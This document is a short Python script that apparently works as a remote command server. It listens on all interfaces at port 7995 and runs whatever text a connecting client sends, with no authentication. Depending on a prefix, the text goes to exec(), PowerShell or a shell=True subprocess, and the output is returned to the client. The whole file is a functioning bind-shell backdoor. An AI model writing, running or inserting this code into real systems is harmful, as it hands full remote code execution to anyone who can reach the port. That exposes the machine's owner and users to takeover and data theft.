import socket
import subprocess

def execute_command(command):
    if command.startswith("python "):
        python_code = command[len("python "):]
        try:
            exec(python_code)
            return "Python code executed successfully."
        except Exception as e:
            return f"Error executing Python code: {str(e)}"
    elif command.startswith("powershell "):
        ps_command = command[len("powershell "):]
        try:
            result = subprocess.run(["pwsh", "-Command", ps_command], capture_output=True, text=True)
            return result.stdout
        except subprocess.CalledProcessError as e:
            return e.stderr
    else:
        try:
            result = subprocess.run(command, shell=True, check=True, capture_output=True, text=True)
            return result.stdout
        except subprocess.CalledProcessError as e:
            return e.stderr

def main():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 7995))  # Listening on port 7995
    server_socket.listen(1)
    print("Server is listening on port 7995...")
    
    while True:
        client_socket, addr = server_socket.accept()
        print(f"Connection from {addr} has been established.")
        
        received_data = client_socket.recv(1024).decode('utf-8')
        print(f"Received command: {received_data}")
        
        result = execute_command(received_data)
        client_socket.send(result.encode('utf-8'))
        
        client_socket.close()

if __name__ == "__main__":
    main()
